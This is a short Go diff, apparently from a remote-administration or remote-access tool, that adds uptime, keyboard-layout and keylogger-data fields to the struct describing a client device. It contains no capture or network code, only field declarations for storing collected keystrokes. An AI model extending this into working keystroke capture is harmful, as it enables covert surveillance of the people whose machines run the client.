@@ -33,6 +33,9 @@ type Device struct {
 	Latency  uint   `json:"latency"`
 	Hostname string `json:"hostname"`
 	Username string `json:"username"`
+	ClientUptime int64 `json:"clientuptime"`
+	KeyloggerData []string `json:"keyloggerdata"`
+	KeyboardLayout string `json:"keyboardlayout"`
 }
 
 type IO struct {
